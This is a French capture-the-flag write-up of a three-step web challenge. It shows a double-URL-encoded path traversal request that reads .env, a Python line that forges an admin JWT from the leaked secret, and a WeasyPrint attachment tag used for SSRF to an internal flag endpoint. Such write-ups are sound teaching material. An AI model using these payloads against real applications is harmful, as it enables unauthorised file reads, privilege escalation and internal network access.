---
title: "Cagliostro · LFI + JWT + WeasyPrint"
platform: "HackerLab Benin 2026"
category: "web"
difficulty: "—"
points: 0
os: "—"
date: 2026-11-20
author: "DazBot13-boopt, elielfresnel"
author_github: "DazBot13-boopt"
source: "https://github.com/DazBot13-boopt/hackerlab-benin-2026-wu/blob/main/web/cagliostro.md"
tags: [hackerlab-benin-2026, web]
status: published
---

# Cagliostro : Web · LFI + JWT forge + WeasyPrint SSRF

**Catégorie** : web  
**Flag** : `HLB2026{21ed646b32d8bb8298a7c03c41ba0a1a}`

## TL;DR

Trois étapes en chaîne : un LFI via double URL-encoding pour lire `.env`, une forge JWT pour obtenir un compte admin, puis une SSRF via WeasyPrint pour atteindre un endpoint interne qui expose le flag.

## Lecture du .env via LFI

L'application expose un endpoint de téléchargement avec un paramètre `f=` pour le nom de fichier. Un filtre bloque les traversées de répertoire simples (`../`), mais ne gère pas le double encodage :

```
GET /download?f=%252e%252e%252f%252e%252e%252f%252e%252e%252fapp%252f.env
```

Le serveur décode une première fois et obtient `%2e%2e%2f...`, puis décode à nouveau lors de l'ouverture du fichier, ce qui donne `../../app/.env`. Le fichier contient :

```
JWT_SECRET=cagliostro-s3cr3t-2026
```

## Forge JWT admin

Avec le secret récupéré, on forge un token HS256 avec `role=admin` :

```python
import jwt
token = jwt.encode({"sub": "attacker", "role": "admin"}, "cagliostro-s3cr3t-2026", algorithm="HS256")
```

Le token donne accès aux fonctionnalités admin, dont la génération de PDF via WeasyPrint.

## SSRF via WeasyPrint

Le générateur de PDF accepte un champ `description` qui est injecté dans le template HTML sans échappement (`|safe` dans Jinja2). WeasyPrint résout les balises `<link rel=attachment>` lors du rendu :

```html
<link rel="attachment" href="http://127.0.0.1:8080/flag">
```

WeasyPrint fait une requête interne vers `127.0.0.1:8080/flag` et l'inclut dans le PDF en pièce jointe. L'endpoint `/flag` n'est accessible que depuis localhost.

Le PDF retourné contient le flag en pièce jointe :

```
HLB2026{21ed646b32d8bb8298a7c03c41ba0a1a}
```

Note : le flag se termine par `}}` dans la réponse brute : un seul `}` fait partie du format, l'autre est un artefact du template.

## À retenir

Le double URL-encoding est un bypass classique des filtres de path traversal qui ne normalisent qu'une seule fois. WeasyPrint avec `|safe` est un vecteur SSRF connu : toute ressource atteignable depuis le serveur de rendu est accessible.
